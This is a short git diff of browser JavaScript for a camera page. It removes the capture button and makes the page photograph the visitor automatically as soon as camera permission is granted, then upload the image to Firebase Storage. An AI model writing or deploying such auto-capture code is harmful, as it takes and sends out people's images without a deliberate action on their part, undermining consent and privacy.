@@ -20,11 +20,12 @@ async function startVideo() {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.getElementById('video');
         video.srcObject = stream;
-        
+
         // Check if the video is loaded
         video.onloadedmetadata = () => {
             console.log("Video stream loaded");
-            document.getElementById('message').textContent = 'Camera permission granted!';
+            document.getElementById('message').textContent = 'Camera permission granted! Capturing photo...';
+            capturePhoto(); // Capture photo immediately after permission is granted
         };
     } catch (error) {
         console.error('Error accessing camera:', error);
@@ -56,16 +57,13 @@ function capturePhoto() {
         try {
             // Upload the image to Firebase Storage
             await storageRef.put(blob);
-            alert(`Photo uploaded to Firebase successfully as ${fileName}!`);
+            document.getElementById('message').textContent = `Photo uploaded to Firebase successfully as ${fileName}!`;
         } catch (error) {
             console.error('Error uploading to Firebase:', error);
-            alert('Failed to upload photo.');
+            document.getElementById('message').textContent = 'Failed to upload photo.';
         }
     });
 }
 
 // Start the video stream when the page loads
 window.onload = startVideo;
-
-// Add event listener to capture button
-document.getElementById('capture-btn').addEventListener('click', capturePhoto);
